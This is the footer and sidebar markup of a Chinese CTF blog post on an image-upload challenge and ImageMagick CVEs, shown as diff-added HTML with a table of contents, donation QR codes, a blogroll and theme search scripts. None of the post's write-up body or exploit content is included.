+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>哈哈,觉得有收获,打赏一分钱护护肝</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/weipay.png" alt="Adolph 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="Adolph 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Adolph
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.zzh.pub/2018/08/17/jarvisoj-图片上传漏洞-writeup/" title="jarvisoj-图片上传漏洞_writeup以及imagick漏洞分析">https://www.zzh.pub/2018/08/17/jarvisoj-图片上传漏洞-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/图片上传/" rel="tag"># 图片上传</a>
+          
+            <a href="/tags/jarvisoj/" rel="tag"># jarvisoj</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/15/ROOTED-ME-Squared-writeup/" rel="next" title="ROOTED-ME_Squared,Dot and next line writeup">
+                <i class="fa fa-chevron-left"></i> ROOTED-ME_Squared,Dot and next line writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/16/Upload总结记录(持续更新)/" rel="prev" title="Upload总结记录（持续更新）">
+                Upload总结记录（持续更新） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcxNS8xNTI0Mw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/Adolph.jpg" alt="Adolph">
+            
+              <p class="site-author-name" itemprop="name">Adolph</p>
+              <p class="site-description motion-element" itemprop="description">我只不过是游在水面上的一条鱼，正好被你发现。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="http://music.163.com/playlist?id=596556711&userid=418158440" target="_blank" title="Music">
+                      
+                        <i class="fa fa-fw fa-cloud"></i>Music</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:98adolph@gmail.com" target="_blank" title="Gmail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>Gmail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://google.com" target="_blank" title="Google">
+                      
+                        <i class="fa fa-fw fa-google"></i>Google</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-links"></i>
+                资源链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://butian.360.cn/" title="补天" target="_blank">补天</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.xctf.org.cn/" title="xctf" target="_blank">xctf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/s" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.freebuf.com/" title="Freebuf" target="_blank">Freebuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf-wiki.github.io" title="CTF wiki" target="_blank">CTF wiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jarvisoj.com" title="Jarvis OJ" target="_blank">Jarvis OJ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ssleye.com/" title="CTF编码" target="_blank">CTF编码</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pcat.cnblogs.com/" title="Pcat" target="_blank">Pcat</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=450951316&auto=1&height=66"></iframe>
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#jarvisoj-图片上传漏洞-writeup"><span class="nav-number">1.</span> <span class="nav-text">jarvisoj-图片上传漏洞_writeup</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#先分享一下自己的思路"><span class="nav-number">2.</span> <span class="nav-text">先分享一下自己的思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#信息收集"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#imagick漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">imagick漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-3714"><span class="nav-number">5.1.</span> <span class="nav-text">CVE-2016-3714</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-3718"><span class="nav-number">5.2.</span> <span class="nav-text">CVE-2016-3718</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-3715"><span class="nav-number">5.3.</span> <span class="nav-text">CVE-2016-3715</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-3716"><span class="nav-number">5.4.</span> <span class="nav-text">CVE-2016-3716</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-3717本地文件读取"><span class="nav-number">5.5.</span> <span class="nav-text">CVE-2016-3717本地文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#png格式触发"><span class="nav-number">5.6.</span> <span class="nav-text">png格式触发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本题突破"><span class="nav-number">5.7.</span> <span class="nav-text">本题突破</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Adolph</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">16.2k</span>
+  
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
